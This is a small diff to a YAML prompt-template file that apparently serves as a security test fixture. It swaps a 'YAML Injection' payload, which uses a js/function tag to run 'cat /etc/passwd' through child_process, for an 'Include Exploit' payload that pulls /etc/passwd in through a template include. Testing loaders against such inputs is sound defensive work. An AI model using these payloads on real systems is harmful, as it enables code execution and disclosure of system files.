@@ -1,9 +1,8 @@
-name: "YAML Injection"
-content: !<tag:yaml.org,2002:js/function> |
-  function(){
-    return require('child_process').execSync('cat /etc/passwd').toString();
-  }
+name: "Include Exploit"
+content: |
+  {% include "/etc/passwd" %}
+  {{file}}
 input_variables:
-  dummy:
+  file:
     type: "string"
-    description: "Dummy variable"
+    description: "Test"
